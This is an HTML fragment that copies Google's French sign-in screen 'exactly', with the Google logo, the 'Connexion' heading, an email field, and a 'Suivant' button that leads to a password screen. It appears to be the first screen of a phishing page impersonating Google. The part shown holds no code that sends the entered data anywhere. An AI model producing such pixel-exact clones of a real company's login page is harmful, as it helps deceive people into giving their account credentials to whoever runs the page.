<!-- Écran 1 : Saisie de l'email - Design exact IMG_0525 -->
<div id="page-email" class="screen" style="background:#fff;min-height:100vh;padding:24px;font-family:'Google Sans',Roboto,Arial,sans-serif;">
    <div style="max-width:400px;margin:0 auto;padding-top:40px;">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:48px;height:48px;margin:0 0 16px 0;display:block;">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>
        <h1 style="font-size:32px;font-weight:400;margin-bottom:16px;color:#202124;">Connexion</h1>
        <p style="font-size:16px;line-height:1.5;margin-bottom:32px;color:#202124;">
            Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.
        </p>
        <div style="margin-bottom:8px;">
            <input type="text" id="emailInput" placeholder="Adresse e-mail ou telephone" 
                style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;transition:all 0.2s;height:56px;"
                onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'" 
                onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'">
        </div>
        <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:8px 0 48px 0;display:inline-block;">Adresse e-mail oubliee ?</a>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:48px;">
            <button onclick="showScreen('page-start')" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px;border-radius:4px;">Creer un compte</button>
            <button onclick="goToPassword()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;">Suivant</button>
        </div>
    </div>
</div>
